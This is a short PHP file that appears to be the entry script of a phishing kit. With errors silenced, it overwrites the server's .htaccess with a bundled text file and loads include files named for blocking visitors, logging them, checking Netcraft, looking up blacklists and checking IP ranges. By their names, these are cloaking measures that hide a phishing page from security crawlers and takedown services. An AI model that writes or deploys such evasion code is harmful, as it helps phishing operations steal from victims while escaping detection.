<?php
/*
RSJ
*/
    
    @unlink(".htaccess");
    @copy("_HIROy.txt",".htaccess");
    @require_once "start_.php";
    @require "assets/includes/blockers.php";
    @require "assets/includes/visitor_log.php";
    @require "assets/includes/netcraft_check.php";
    @require "assets/includes/blacklist_lookup.php";
    @require "assets/includes/ip_range_check.php";

?>